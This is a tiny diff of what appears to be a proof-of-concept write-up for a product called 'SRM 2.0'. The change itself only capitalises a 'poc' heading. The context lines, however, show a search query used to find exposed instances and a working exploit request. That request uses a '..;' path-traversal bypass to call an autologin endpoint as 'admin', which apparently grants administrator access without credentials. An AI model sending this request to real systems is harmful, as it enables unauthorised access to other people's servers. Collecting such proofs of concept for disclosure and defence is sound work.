@@ -8,7 +8,7 @@
 title=="SRM 2.0"
 ```
 
-## poc
+## POC
 
 ```java
 GET /adpweb/static/..;/api/sys/app/autologin?loginName=admin HTTP/1.1
